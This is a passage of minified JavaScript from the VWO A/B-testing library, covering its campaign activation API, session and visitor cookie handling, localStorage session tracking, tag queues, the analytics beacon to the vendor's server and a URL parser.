        })) : v.apply(v, [o, ...r]), t === Ke.VARIATION_SHOWN && !e.props.isFirst && !e.props.isSplitVariation || t === Ke.SPLIT_VARIATION_SHOWN || t == Ke.REGISTER_HIT) {
          const e = zo[Ke.VARIATION_APPLIED],
            t = Xo[e];
          v.apply(v, [t, ...r]), this.vwoEvents.trigger(Ke.VARIATION_APPLIED, {
            oldArgs: r,
            campaignId: parseInt(r[0], Fe),
            combi: r[1].includes(",") ? r[1] : parseInt(r[1], Fe)
          });
        }
      }
    }
  }
  const ei = new Qo(),
    ti = ei.execute.bind(ei),
    ni = ei.wildCardCallback.bind(ei);
  window.VWO.modules.tags.backwardCompatibility = ti, window.VWO.modules.tags.wildCardCallback = ni;
  class oi {
    otherSide(...e) {
      return e[0] = "VWO.modules.tags.backwardCompatibilityUtils." + e[0], e[2] && (e[2] = {
        captureGroups: e[2]
      }), window.fetcher.getValue(...e);
    }
  }
  let ii;
  function ri(e) {
    return d(this, void 0, void 0, function* () {
      yield O.phoenix('store.actions.addValues("${{1}}", "${{2}}" )', null, {
        captureGroups: [e, "vwoInternalProperties"]
      });
    });
  }
  class si {
    constructor() {
      this.apiCallbacks = {};
    }
    register(e, t) {
      this.apiCallbacks[e] = this.apiCallbacks[e] || [], this.apiCallbacks[e].push(t);
    }
    executeAll(e, t) {
      this.apiCallbacks[e] && this.apiCallbacks[e].forEach(e => {
        e(t);
      });
    }
  }
  const ai = new si();
  let ci = !1;
  class di extends oi {
    postPhoenixMTHook() {
      this.makeSessionAndTagCall();
    }
    declareVWOAPI() {
      O.applyChanges = function (e) {
        return d(this, void 0, void 0, function* () {
          const t = [],
            n = (yield O.phoenix("store.getters")).currentSettings.dataStore.campaigns;
          for (const e in n) t.push(e);
          e = e || t;
          for (var o = 0; o < e.length; o++) {
            const t = e[o],
              i = Wt.isBotScreen();
            yield window.fetcher.getValue('VWO.modules.events.events.variationShown("${{1}}", "${{2}}", "${{3}}")', null, {
              captureGroups: [null, Object.assign({
                id: t,
                variation: "",
                isFirst: 0
              }, i && {
                vwoMeta: {
                  isBot: i
                }
              }), n[t]]
            });
          }
        });
      }, O.activate = function (e, t, n, o) {
        return d(this, void 0, void 0, function* () {
          window.VWO.phoenix('trigger("${{1}}")', null, {
            captureGroups: [Ke.ACTIVATE_API_TRIGGERED]
          });
          var n,
            i = {};
          if ("object" == typeof e && (e = (i = e).keepElementLoadedRunning, t = i.expIds, i.manual, o = i.customUrl, n = i.virtualPageUrl), o && (window._vis_opt_url = o, window.fetcher.setValue("_vis_opt_url", window._vis_opt_url)), t = t || window._vwo_exp_ids, "string" == typeof n && n.trim()) window._vis_opt_url = n, yield window.fetcher.getValue('phoenix.trigger("${{1}}", "${{2}}")', null, {
            captureGroups: ["vwo_urlChange", {
              virtualPageUrl: n,
              location: {
                href: window.location.href,
                search: window.location.search,
                hash: window.location.hash
              }
            }]
          });else if (t && t.length) {
            for (const n of t) {
              const t = window._vwo_exp[n];
              if (t) {
                if (Wt.isSessionBasedCampaign2(t)) {
                  Eo(null, Ke._ACTIVATED, {
                    id: n
                  });
                  continue;
                }
                (null == t ? void 0 : t.manual) && (window.VWO._[`keepElementLoadedRunning_${n}`] = e, ri({
                  [`keepElementLoadedRunning_${n}`]: e
                }), Eo(null, Ke.ACTIVATED, {
                  id: n
                }));
              }
            }
            o && (yield window.fetcher.getValue("VWO.modules.tags.activate"));
          }
        });
      }, O.revertChanges = function (e) {
        return d(this, void 0, void 0, function* () {
          const t = (yield O.phoenix("store.getters")).currentSettings.dataStore.campaigns[e];
          if (t && t.sections) for (var n = Xe(t.sections), o = 0; o < n.length; o++) vwo_$(".vwo_loaded.vwo_loaded_" + e + "._vwo_variation_" + n[o]).remove(), delete t.sections[n[o]].loaded, yield window.fetcher.setValue(`VWO._.allSettings.dataStore.campaigns.${e}.sections.${n[o]}.loaded`, void 0);
        });
      }, O.modifyClickPauseTime = function (e) {
        e = e || {
          time: 0,
          useBeacon: !1
        }, O._.redirectionDelayTime = e.time, e.useBeacon && (O.data.tB = !0);
      }, O.destroy = function () {
        return d(this, void 0, void 0, function* () {
          yield O.phoenix("destroy()"), So.clearAllListeners();
        });
      }, O.setFetchSettingsDelay = function (e) {
        ri({
          SPA_SETTINGS_DELAY: e
        });
      }, O.disableAutofetchSettings = function () {
        ri({
          disableAutofetchSettings: !0
        });
      }, O.refreshElements = function (e, t) {
        var n;
        return d(this, void 0, void 0, function* () {
          if (!e) return;
          e instanceof Array || (e = [e]);
          const o = yield O.phoenix("store.getters"),
            i = [];
          for (const e in o.currentSettings.dataStore.campaigns) i.push(e);
          t = t || i;
          for (var r = vwo_$(e.join(",")), s = 0; s < t.length; s++) {
            var a = "vwo_loaded_" + t[s];
            r.each(function (e, t) {
              var n = vwo_$(t);
              n.hasClass(a) ? n.removeClass(a) : n.parents("." + a).eq(0).removeClass(a);
            });
          }
          for (const e of t) {
            const t = null === (n = o.currentSettings.dataStore.campaigns) || void 0 === n ? void 0 : n[e];
            if (t && t.ready) {
              const n = Wt.isBotScreen();
              yield window.fetcher.getValue('VWO.modules.events.events.variationShown("${{1}}", "${{2}}", "${{3}}")', null, {
                captureGroups: [null, Object.assign({
                  id: e,
                  variation: "",
                  isFirst: 0
                }, n && {
                  vwoMeta: {
                    isBot: n
                  }
                }), t]
              });
            }
          }
        });
      }, O.fetchPCSettings = function () {
        ii || (ii = !0, ri({
          loadPC: !0
        }));
      }, O.enableSPA = function (e) {
        ri(void 0 === e || e ? {
          isSpaEnabled: !0
        } : {
          isSpaEnabled: e
        });
      }, O.updateSPAWaitTime = function (e) {
        ri({
          SPA_ELEMENT_WAIT_TIMEOUT: e
        });
      }, O.onEventTriggered = function (e) {
        ai.register("onEventTriggered", e), ci || (ci = !0, window.VWO.phoenix('on("${{1}}", "${{2}}")', null, {
          captureGroups: ["*", e => {
            if (e.isCustomEvent) {
              const t = {
                event: e.name
              };
              e.$metaData && (t.metaData = e.$metaData, delete e.$metaData), delete e.page, delete e.isCustomEvent, delete e.name, Object.keys(e).length > 0 && (t.props = e), ai.executeAll("onEventTriggered", t);
            }
          }]
        }));
      }, O.onVWOCampaignsLoaded = function (e) {
        window.VWO._.bucketedCampaignsAPIStore = window.VWO._.bucketedCampaignsAPIStore || {}, window.VWO._.bucketedCampaignsAPIStore.callbacks = window.VWO._.bucketedCampaignsAPIStore.callbacks || [], window.VWO._.bucketedCampaignsAPIStore.campaigns && e({
          bucketed_campaigns: window.VWO._.bucketedCampaignsAPIStore.campaigns
        }), window.VWO._.bucketedCampaignsAPIStore.callbacks.push(e);
      }, O.deactivate = function (e) {
        return d(this, void 0, void 0, function* () {
          const t = yield O.phoenix("store.getters");
          for (const n of e) t.settings.campaigns[n].dontKillTimer = !1, yield window.fetcher.setValue(`VWO._.allSettings.dataStore.campaigns.${n}.dontKillTimer`, !1);
        });
      };
    }
    makeSessionAndTagCall() {
      window.VWO._.phoenixMT.on(Ke.NEW_SESSION_CREATED, e => {
        let t = {};
        e && (t = e.props), t.cq = 0, window._vis_debug || ke() || this.makeCallForTagsAndSession(t, "newSession");
      });
    }
    makeCallForTagsAndSession(e, t) {
      return d(this, void 0, void 0, function* () {
        const n = window.VWO._.sessionInfoService;
        void 0 !== O._.insightsOnConsentPromise && (yield O._.insightsOnConsentPromise);
        n.isSessionInfoSynced() || n.setSNCookieValueByIndex2(ft.SESSION_SYNCED_STATE_INDEX, 1);
        const o = n.getSessionId(),
          i = n.getPageId();
        if ((isNaN(o) || isNaN(i)) && window.VWO._.customError) {
          const e = {
            _vwo_sn: Re.get(ft.TRACK_SESSION_COOKIE_NAME),
            _vwo_ds: Re.get(ft.TRACK_GLOBAL_COOKIE_NAME)
          };
          let t = "Error while sending s.gif: ";
          isNaN(o) && (t += "Session Id is NaN"), isNaN(i) && (t = t ? t + ", " : t, t += "Page Id is NaN", e.pageId = i), window.VWO._.customError({
            msg: t,
            url: "utilsMT.ts",
            lineno: 326,
            colno: 327,
            source: JSONStringify(e)
          });
        }
        const r = Wt.extraData2(!0),
          s = encodeURIComponent(r),
          a = Wt.createUUIDCookie2({
            vwoUUID: De.vwoUUID
          }),
          c = "s.gif?account_id=" + De.accountId + Wt.getUUIDString(a) + "&s=" + o + ("newSession" === t ? "&ed=" + s + "&cu=" + encodeURIComponent(De.currentUrl) + "&r=" + (O.data.vi && "new" === O.data.vi.vt ? 0 : 1) : "") + "&p=" + i + (e.tags ? "&tags=" + e.tags : "") + (e.egTagValue ? "&eg=" + e.egTagValue : "") + ("sessionUpdate" === t ? "&update=1" : "") + "&cq=" + e.cq;
        try {
          JSON.parse(decodeURIComponent(s)).lt;
        } catch (e) {
          window.VWO._.customError && window.VWO._.customError({
            msg: "extraData(ed) is not a JSON string [while sending call for 's.gif']",
            url: "utilsMT.ts",
            lineno: 374,
            colno: 5,
            source: JSONStringify({
              extraData: r,
              lt: new Date().getTime(),
              referrer: Pe.get(),
              requestURL: c
            })
          });
        }
        uo.sendCall({
          serverUrl: De.serverUrl,
          accountId: De.accountId
        }, {
          url: c
        }, "", ({
          isError: e
        }) => {
          !e && "newSession" == t && He.includes(window._vwo_acc_id) && Wt.setOnLocalStorageOnBothThreads("vwo_newSessionCreated", {
            uuid: a,
            sessionId: o,
            sessionCookie: Re.get(ft.TRACK_SESSION_COOKIE_NAME),
            cURL: De.currentUrl
          });
        });
      });
    }
    sendRegisterCall(e, t, n) {
      uo.sendCall(e, {
        url: t,
        successCallback: n
      }, null, null, !0);
    }
  }
  const li = new di();
  window.VWO.modules.tags.backwardCompatibilityUtils = li;
  class ui {
    otherSide(...e) {
      return e[0] = "VWO.modules.tags.setSession." + e[0], window.fetcher.getValue(...e);
    }
  }
  let wi;
  const _i = {
    get: e => {
      try {
        return window.localStorage.getItem(e);
      } catch (e) {
        return "";
      }
    },
    set: (e, t) => {
      try {
        return wi._setItem(e, t);
      } catch (e) {
        return "";
      }
    },
    remove: e => {
      try {
        return wi._removeItem(e);
      } catch (e) {
        return !1;
      }
    },
    getItem: function (e) {
      return this.get(e);
    },
    setItem: function (e, t) {
      this.set(e, t);
    },
    deleteAll: function () {},
    deleteItem: function (e) {
      this.remove(e);
    }
  };
  function gi(e) {
    wi = e;
  }
  window.VWO._.localStorageService = _i;
  class pi {
    otherSide(...e) {
      return e[0] = "VWO.modules.tags.sessionInfoService." + e[0], e[2] && (e[2] = {
        captureGroups: e[2]
      }), window.fetcher.getValue(...e);
    }
  }
  function hi(e, t, n) {
    "Array" === e ? (this.tags = [], this.lastSent = 0) : "Hash" === e && (this.tags = {}, this.sentTags = {}), this.type = e, this.maxCount = t || 1 / 0, this.addTagCallback = n || function () {};
  }
  pi.LOCAL_STORAGE_SESSION_EXPIRY = 30, pi.LOCAL_STORAGE_NAME = window._vis_debug ? "debug_vwoSn" : "vwoSn", pi.ACCOUNT_ID = window._vwo_acc_id, hi.prototype.add = function (e, t) {
    if (e) {
      var n = this.tags;
      "Array" === this.type ? ("[object Array]" !== Object.prototype.toString.call(e) && (e = [e]), e = nt(e, function (e) {
        return e = encodeURIComponent(e.trim());
      }), n = ot(n = (n = n.concat(e)).slice(0, this.maxCount), function (e, t) {
        return n.indexOf(e) === t;
      }), this.tags = n) : "Hash" === this.type && (this.sentTags[e] && this.sentTags[e] === t || (this.tags[encodeURIComponent(e)] = encodeURIComponent(t))), this.addTagCallback();
    }
  }, hi.prototype.get = function () {
    var e;
    if (this.isTagPassed()) return "Array" === this.type ? (e = this.tags.slice(this.lastSent), this.lastSent = this.tags.length) : "Hash" === this.type && (e = this.tags, ze(this.sentTags, this.tags), this.tags = {}), e;
  }, hi.prototype.isTagPassed = function () {
    return "Array" === this.type ? this.tags.length > this.lastSent : "Hash" === this.type && Xe(this.tags).length > 0;
  }, hi.prototype.reset = function () {
    "Array" === this.type ? (this.tags = [], this.lastSent = 0) : "Hash" === this.type && (this.tags = {}, this.sentTags = {});
  }, hi.prototype.refresh = function () {
    "Array" === this.type ? this.lastSent = 0 : "Hash" === this.type && (ze(this.tags, this.sentTags), this.sentTags = {});
  };
  const vi = "eg";
  let fi = {},
    Ei,
    mi = ["u", "s", "p", "ui", "si", "pi"],
    Oi = function () {},
    Si = {
      user: "u",
      session: "s",
      page: "p"
    };
  for (Ei = 0; Ei < mi.length; Ei++) fi[mi[Ei]] = new hi("Hash");
  fi[vi] = new hi("Array");
  const Ti = {
    onPush: function (e) {
      "function" == typeof e && (Oi = e);
    },
    getTags: function () {
      let e = {},
        t = "";
      for (Ei = 0; Ei < mi.length; Ei++) {
        const t = fi[mi[Ei]].get();
        t && (e[mi[Ei]] = Ot(t));
      }
      for (const n in e) e.hasOwnProperty(n) && (t += '"' + n + '":' + e[n] + ",");
      return t = t && "{" + t.slice(0, -1) + "}", t;
    },
    getEgTags: function () {
      const e = fi[vi].get();
      if (e) return e.join();
    },
    addTag: function (e, t, n, o) {
      let i = Si[n = n || "session"];
      if (!i) {
        if (n !== vi) return;
        i = vi;
      }
      o && (i += "i"), fi[i].add(e, t), Oi();
    },
    refresh: function () {
      fi.s.reset(), fi.si.refresh(), fi[vi].refresh();
    }
  };
  window.VWO.tag = Ti.addTag, window.VWO._.tags = Ti;
  const Ci = {
    getDataStore: function () {
      return this.getDSCookieValueByIndex(1);
    },
    setDataStore: function (e) {
      Re.create(ft.TRACK_GLOBAL_COOKIE_NAME, this.getMetaStore() + "$" + e, Et());
    },
    getMetaStore: function () {
      return this.getDSCookieValueByIndex(0) || "";
    },
    setMetaStore: function (e) {
      Re.create(ft.TRACK_GLOBAL_COOKIE_NAME, e + "$" + this.getDataStore(), Et());
    },
    getMetaInfoByIndex: function (e) {
      return this.getMetaStore().split(":")[e];
    },
    setMetaInfoByIndex: function (e, t) {
      var n = this.getMetaStore().split(":");
      n[e] = t, this.setMetaStore(n.join(":"));
    },
    setDataInfoByIndex: function (e, t) {
      var n = this.getDataStore().split(":");
      n[e] = t, this.setDataStore(n.join(":"));
    },
    getDataInfoByIndex: function (e) {
      return this.getDataStore().split(":")[e];
    },
    getDSCookieValueByIndex: function (e) {
      var t = Re.get(ft.TRACK_GLOBAL_COOKIE_NAME);
      return t ? t.split("$")[e] : null;
    },
    getCookieVersion: function () {
      return Re.get(ft.TRACK_GLOBAL_COOKIE_NAME).split("$")[0].split(":")[ft.COOKIE_VERSION_INDEX];
    },
    deleteDataStoreInfoByIndex: function (e) {
      var t = this.getDataStore();
      t && ((t = t.split(":"))[e] = "", t = t.join(":"), this.setDataStore(t));
    }
  };
  window.VWO._.commonCookieHandler = Ci;
  class yi {
    constructor() {
      this.eventCallbacks = [], this.isInitialized = !1;
    }
    onActivity() {
      if (xt.shouldWeTrackVisitor()) for (let e = 0; e < this.eventCallbacks.length; e++) this.eventCallbacks[e]();
    }
    init() {
      if (this.isInitialized) return;
      const e = It(() => {
        this.onActivity();
      }, 1e3);
      document.addEventListener ? (document.addEventListener("mouseup", e), document.addEventListener("keyup", e), document.addEventListener("mousemove", e), document.addEventListener("scroll", e)) : document.attachEvent && (document.attachEvent("onmouseup", e), document.attachEvent("onkeyup", e), document.attachEvent("onmousemove", e), document.attachEvent("onscroll", e)), this.isInitialized = !0;
    }
    track(e) {
      this.eventCallbacks.push(e), this.init();
    }
  }
  const Ii = new yi();
  function Ai() {
    _i.remove(pi.LOCAL_STORAGE_NAME);
  }
  let Ni;
  window.VWO._.tua = Ii;
  class bi extends pi {
    constructor() {
      super(), this.firstSessionCreated = !1, this.vwoSn = {
        cu: "",
        r: "",
        lt: 0,
        v: "0.1.0"
      }, Ni = this, this.expireSessionOnDateChange(), this.visitorInformation = window.VWO.data.vi = window.VWO.data.vi || {}, this.setVWOSn(), this.getSessionStore() && this.initialize(), Ii.track(() => {
        this.updateLocalStorageSession();
      });
    }
    triggerNewSessionEvent() {
      window.VWO.phoenix('trigger("${{1}}")', null, {
        captureGroups: [Ke.NEW_SESSION_CREATED]
      }), window.VWO._.phoenixMT.trigger(Ke.NEW_SESSION_CREATED);
    }
    expireSessionOnDateChange() {
      if (!this.getSessionStore()) return;
      const e = this.getSessionId();
      if (e) {
        const t = new Date(1e3 * e).getDate();
        new Date(rt()).getDate() !== t && this.eraseSessionCookie();
      }
    }
    initializeSession2(e) {
      const t = !this.getSessionStore();
      this.setSessionStore(e + ""), this.setVisitorInformation(), this.updateAndSyncPageId(), this.initialize(t);
    }
    getDSCookieValueByIndex(e) {
      var t = this.getGlobalCookie();
      return t ? t.split("$")[e] : null;
    }
    initialize(e) {
      this.isInitiatedOnce || (this.isInitiatedOnce = !0, this.attachTagsPushCallback() || (null != e ? !e : this.getSessionStore()) || this.triggerNewSessionEvent(), Ii.track(() => {
        this.updateSession();
      }), this.addValues({
        sessionStart: this.getSessionId()
      }, "root"), this.fireSessionEvent());
    }
    fireSessionEvent() {
      window.VWO.phoenix('trigger("${{1}}", "${{2}}" )', null, {
        captureGroups: [Ke.SESSION, {
          VWO: {
            firedTime: 1e3 * this.getSessionId()
          }
        }]
      });
    }
    attachTagsPushCallback() {
      let e, t;
      const n = this,
        o = function (o) {
          e = Ti.getTags(), t = Ti.getEgTags();
          const i = Wt.doesSessionBasedCampaignExistsInTags(e);
          if (!window._vis_debug && !ke() && (e || t)) {
            if (!o && !n.getSessionStore()) {
              const o = {
                name: Ke.NEW_SESSION_CREATED,
                time: +new Date(),
                props: {
                  pageId: n.getPageId(),
                  tags: e,
                  egTagValue: t,
                  cq: i
                }
              };
              return Eo(null, Ke.NEW_SESSION_CREATED, o), window.VWO._.phoenixMT.trigger(Ke.NEW_SESSION_CREATED, o), !0;
            }
            window.fetcher.getValue("VWO.modules.events.events.dimensionTagPushed", [null, {
              tags: e,
              egTagValue: t,
              cq: i
            }]);
          }
          return !1;
        },
        i = At(o, 10);
      return Ti.onPush(() => i(!0)), o();
    }
    updateSession() {
      this.updateSession2();
    }
    updateSession2() {
      let e = this.getSessionStore();
      e && this.expireSessionOnDateChange(), e = this.getSessionStore(), this.sessionTimer || e ? (e && (this.setSessionStore(e), this.addValues({
        sessionStart: this.getSessionId()
      }, "root")), this.updateSessionTimer()) : this.retrackVisitor();
    }
    updateSessionTimer() {
      this.sessionTimer && clearTimeout(this.sessionTimer), this.sessionTimer = setTimeout(() => this.eraseSessionCookie(), ft.SESSION_TIMER_EXPIRE);
    }
    retrackVisitor() {
      const e = rt(!0) - Ni.getFirstSessionId();
      this.setSessionStore(e + ""), this.triggerNewSessionEvent(), window.VWO.phoenix('trigger("${{1}}")', null, {
        captureGroups: [Ke.RETRACK_VISITOR]
      });
    }
    initializeSession(e) {
      this.initializeSession2(e);
    }
    setVisitorInformation() {
      window.VWO.data.vi.vt = Ni.visitorInformation.vt = Ni.isReturningVisitor() ? "ret" : "new", window.fetcher.setValue("VWO.data.vi.vt", window.VWO.data.vi.vt);
    }
    getPageIdInfo() {
      const e = this.getSessionStore(),
        t = e && e.split(":")[ft.PAGE_ID_INFORMATION_INDEX];
      return t && t.split("_");
    }
    markPageIdSessionExpiry() {
      const e = this.getPageId() + "_" + (rt(!0) - this.getFirstSessionId() + ft.PAGE_ID_EXPIRY);
      Ni.markPageId(e);
    }
    getPageId() {
      const e = this.getPageIdInfo(),
        t = e && e[0];
      return t ? parseInt(t, 10) : 0;
    }
    isReturningVisitor() {
      return Ni.getSessionId() > Ni.getFirstSessionId();
    }
    setVWOSn() {
      const e = this.getLocalStorageSession();
      e ? this.vwoSn = e || {} : this.createLocalStorageSession();
    }
    getInfo() {
      return this.vwoSn;
    }
    removeInfo() {
      this.vwoSn = {
        cu: "",
        r: "",
        lt: 0,
        v: "0.1.0"
      };
    }
    getRelativeSessionTimestamp() {
      const e = this.getFirstSessionId();
      return this.firstSessionCreated ? rt(!0) - e : (this.firstSessionCreated = !0, it(!0) - e);
    }
    updateLocalStorageSession() {
      const e = this.getLocalStorageSession();
      !e || (rt(!0) - e.lt) / 60 > pi.LOCAL_STORAGE_SESSION_EXPIRY ? this.createLocalStorageSession() : this.updateTimestampInfo(e);
    }
    updateTimestampInfo(e) {
      this.vwoSn = e, this.vwoSn.lt = rt(!0), this.setLocalStorageSession();
    }
    createLocalStorageSession(e) {
      e ? (this.vwoSn.cu = `${document.URL}#vwo_fix`, this.vwoSn.r = `${document.referrer}#vwo_fix`) : (this.vwoSn.cu = document.URL, this.vwoSn.r = document.referrer), this.vwoSn.lt = rt(!0), this.setLocalStorageSession();
    }
    getLocalStorageSession(e) {
      let t = _i.get(bi.LOCAL_STORAGE_NAME);
      try {
        t = t ? mt(t) : null;
      } catch (t) {
        Ai(), this.otherSide('createLocalStorageSession("${{1}}")', null, [!0]), e || this.getLocalStorageSession(!0);
      }
      return t ? t.v ? (t.cu = decodeURIComponent(t.cu), t.r = decodeURIComponent(t.r), t) : (t.v = "0.1.0", t) : null;
    }
    addValues(e, t) {
      return window.VWO.phoenix('store.actions.addValues("${{1}}", "${{2}}" )', null, {
        captureGroups: [e, t]
      });
    }
    updateAndSyncPageId() {
      let e;
      e = window.VWO._.pageId, e || (e = this.updatePageId(), this.otherSide('setPageIdValue("${{1}}")', null, [e]));
    }
    updatePageId() {
      let e = this.getPageId();
      return this.shouldUpdatePageCount() && (e += 1), this.markPageId(e), window.VWO._.pageId = e, e;
    }
    markPageId(e) {
      this.setSNCookieValueByIndex2(ft.PAGE_ID_INFORMATION_INDEX, e);
    }
    setSNCookieValueByIndex2(e, t) {
      const n = this.getSessionStore(),
        o = n && n.split(":") || [];
      o[e] = t + "", this.setSessionStore(o.join(":"));
    }
    shouldUpdatePageCount() {
      const e = this.getPageIdInfo(),
        t = parseInt(e && e[1], 10);
      return !t || rt(!0) - Ni.getFirstSessionId() > t;
    }
    setSNCookieValueByIndex(e, t) {
      const n = this.getSessionStore(),
        o = n && n.split(":") || [];
      o[e] = t + "", Re.create(ft.TRACK_SESSION_COOKIE_NAME, o.join(":"), ft.TRACK_SESSION_COOKIE_EXPIRY);
    }
    getSessionId() {
      return this.getFirstSessionId() + this.getRelativeSessionId();
    }
    setSessionStore(e) {
      if (xt.shouldWeTrackVisitor()) return Re.create(ft.TRACK_SESSION_COOKIE_NAME, e, ft.TRACK_SESSION_COOKIE_EXPIRY);
    }
    getRelativeSessionId() {
      let e = this.getSessionStore();
      if (!e) {
        var t = rt(!0) - this.getFirstSessionId();
        this.setSessionStore(t + ""), e = this.getSessionStore();
      }
      return e && +e.split(":")[ft.RELATIVE_SESSION_ID_INDEX];
    }
    setLocalStorageSession() {
      xt.shouldWeTrackVisitor() && (this.vwoSn.v && (this.vwoSn.cu = encodeURIComponent(this.vwoSn.cu), this.vwoSn.r = encodeURIComponent(this.vwoSn.r)), _i.set(bi.LOCAL_STORAGE_NAME, yt(this.vwoSn)));
    }
    getSessionStore() {
      return Re.get(ft.TRACK_SESSION_COOKIE_NAME);
    }
    getGlobalCookie() {
      return Re.get(ft.TRACK_GLOBAL_COOKIE_NAME);
    }
    eraseSessionCookie() {
      this.sessionTimer = null, Re.erase(ft.TRACK_SESSION_COOKIE_NAME);
    }
    getPcTrafficFromCookie() {
      var e = Ci.getDataStore();
      return e ? parseFloat(e.split(":")[ft.PC_TRAFFIC_INDEX]) : null;
    }
    getFirstSessionId() {
      let e = Ci.getDataStore();
      return e || (this.createGlobalCookie(), e = Ci.getDataStore()), e && +e.split(":")[ft.FIRST_SESSION_ID_INDEX];
    }
    getSNCookieValueByIndex(e) {
      var t = this.getSessionStore();
      return t ? t.split(":")[e] : null;
    }
    createGlobalCookie() {
      if (!xt.shouldWeTrackVisitor()) return;
      const e = ft.COOKIE_VERSION + "$" + it(!0) + ":" + this.getPcTraffic() + "::";
      Re.create(ft.TRACK_GLOBAL_COOKIE_NAME, e, Et());
    }
    isSessionInfoSynced() {
      return this.getSNCookieValueByIndex(ft.SESSION_SYNCED_STATE_INDEX);
    }
    getPcTraffic() {
      return void 0 !== this.pcTraffic && null !== this.pcTraffic || (this.pcTraffic = this.getPcTrafficFromCookie(), this.pcTraffic = this.pcTraffic || parseFloat((100 * Math.random()).toFixed(8))), this.pcTraffic;
    }
    shouldSendSessionInfoInCall() {
      return !0;
    }
  }
  class Vi extends ui {
    constructor() {
      super(), window.VWO._.phoenixMT.on("vwo_phoenixInitCalled", () => {
        this.execute({
          vwoUUID: De.vwoUUID
        });
      }), window.VWO._.phoenixMT.on("vwo_urlChangeMt", () => {
        window.VWO._.pageId = void 0, this.execute({
          vwoUUID: De.vwoUUID
        });
      });
    }
    execute(e) {
      return d(this, void 0, void 0, function* () {
        let t;
        if (window.VWO.modules.tags.sessionInfoService ? t = window.VWO.modules.tags.sessionInfoService : (t = new bi(), window.VWO.modules.tags.sessionInfoService = t, window.VWO._.sessionInfoService = t), t.getSessionStore()) He.includes(window._vwo_acc_id) && Wt.setOnLocalStorageOnBothThreads("vwo_newSessionCreated", {
          user: "old"
        }, ["user"]), t.fireSessionEvent(), t.setVisitorInformation(), t.updateAndSyncPageId();else {
          He.includes(window._vwo_acc_id) && Wt.setOnLocalStorageOnBothThreads("vwo_newSessionCreated", {
            user: "new"
          }, ["user"]), Wt.createUUIDCookie2(e), t.getGlobalCookie() || t.createGlobalCookie();
          const n = t.getRelativeSessionTimestamp();
          t.initializeSession2 && t.initializeSession2(n);
        }
        window.VWO.phoenix('trigger("${{1}}")', null, {
          captureGroups: [Ke.SESSION_INIT_COMPLETE]
        });
      });
    }
  }
  const Ri = new Vi(),
    Li = Ri.execute.bind(Ri);
  window.VWO.modules.tags.setSession = Ri;
  class Pi {
    static parseUrl(e) {
      try {
        e = decodeURIComponent(e);
      } catch (e) {
        console.warn("Not a valid URL.");
      }
      const t = /^((((\w+)(:\/\/))?((\w+):(\w+)@)?(www\.)?)([^?#\/:\s]*)?:?([0-9][^?#\/\s]*)?)\/?([^?#\s]*)\??([^#]*)#?(.*)$/.exec(e.trim());
      if (!t) throw new Error("Not a valid URL.");
      return t && {
        url: t[0],
        origin: t[1].replace(t[6], ""),
        protocol: t[4] || "",
        hasWWW: Boolean(t[9]),
        username: t[7] || "",
        password: t[8] || "",
        host: (t[9] || "") + t[10],
        domain: t[10],
        port: t[11] || "",
        path: t[12],
        query: t[13] || "",
        queryParams: t[13] ? t[13].split("&").reduce((e, t) => {
          const [n, o = ""] = t.split("=");
          return e[n] = o, e;
        }, {}) : {},
        fragment: t[14] || "",
        urlWithoutProtocol: t[0].replace(t[3], ""),
        urlWithoutProtocolAndWww: t[0].replace(t[2], "")
      };
    }
  }
  var Di = {
    LOGGER_LEVEL: "error"
  };
  const xi = Pi.parseUrl(window.location.href).queryParams.vwoLogLevel;
  var Ui = new a(xi || Di.LOGGER_LEVEL);
  class ki {
    constructor() {
      this.plugins = {};
    }
    register(e) {
      Ui.debug(`Registering plugin '${e.pluginName}' in Plugins factory`), this.plugins[e.pluginName] = e;
    }
    unregister(e) {
      let t;
      t = pe(e) ? e : e.pluginName, Ui.debug(`Unregistering plugin '${t}' in Plugins factory`), this.plugins[t].removeAll(), delete this.plugins[t];
    }
    unregisterAll() {
      Ui.debug("Unregistering all plugins in Plugins factory"), Object.keys(this.plugins).forEach(e => {
        this.plugins[e].removeAll(), delete this.plugins[e];
      });
    }
    clearData() {
      Ui.debug("Clearing the data of all the plugins"), Object.keys(this.plugins).forEach(e => {
        this.plugins[e].clearData();
      });
    }
  }
  var Wi = new ki(),
    Mi;
  class Gi {
    clearData() {}
  }
  !function (e) {
    e.EVENT = "event", e.EVENT_PROPS = "eventProps", e.STORAGE = "storage", e.FORMULA = "formula", e.OPERATOR = "operator", e.TAG = "tag", e.CONDITION_LEVEL_OPERATOR = "clOperator";
  }(Mi || (Mi = {}));
  const $i = function (e, t, n) {
    const o = Wi.plugins[Mi.OPERATOR] && Wi.plugins[Mi.OPERATOR].get(e) || (() => !1),
      i = wt();
    t.split(".")[0] === i && (t = t.slice(t.indexOf(".") + 1));
    const r = t.split("."),
      s = ["neq", "neqs", "ncn", "bl"];
    if (window[i] && window[i].length) {
      const a = -1 !== s.indexOf(e);
      for (const e of window[i]) try {
        const i = r.reduce(function (e, t) {
          return void 0 === e ? void 0 : e[t];
        }, e);
        if (a) {
          if (!o.apply(o, [i, n]) || i !== e[t] && !o.apply(o, [e[t], n])) return !1;
        } else if (o.apply(o, [i, n]) || i !== e[t] && o.apply(o, [e[t], n])) return !0;
      } catch (e) {
        c.error("Failed to evaluate the dataLayer variable: ", e);
      }
      return a;
    }
  };
  window.VWO.modules.tags.dL = $i;
  class Fi {
    otherSide(...e) {
      e[0] = "VWO.modules.tags.checkEnvironment." + e[0], window.fetcher.getValue(...e);
    }
  }
  window.VWO.modules.tags.checkEnvironment = {};
  class ji {
    otherSide(...e) {
      e[0] = "VWO.modules.tags.checkEnvironment.utils." + e[0], window.fetcher.getValue(...e);
    }
  }
  class Bi extends ji {
    addDomListenerForTimeout(e) {
      window.addEventListener("load", () => {
        e();
      }), "complete" === document.readyState && e();
    }
  }
  const Hi = new Bi();
  window.VWO.modules.tags.checkEnvironment.utils = Hi;
  class Ki extends Fi {
    constructor() {
      super(), window.VWO._.phoenixMT.on("vwo_init", () => {
        window.VWO._.envUtils = this.getPreRequisites();
      }), window.VWO._.phoenixMT.on("vwo_reRun", () => {
        window.fetcher.setValue("VWO._.envUtils", this.getPreRequisites());
      });
    }
    getPreRequisites() {
      const e = !window.VWO._.cLFE && xt.shouldWeTrackVisitor();
      return {
        doCookiesMatter: e,
        areCookiesDisabled: Wt.areCookiesDisabled(e),
        shouldStopExecWhenSsmNotFound: Wt.shouldStopExecWhenSsmNotFound()
      };
    }
    execute() {}
  }
  const Ji = new Ki(),
    Yi = Ji.execute;
  window.VWO.modules.tags.checkEnvironment.fn = Ji;
  class qi {}
  class Xi extends qi {
    execute() {}
  }
  const zi = new Xi(),
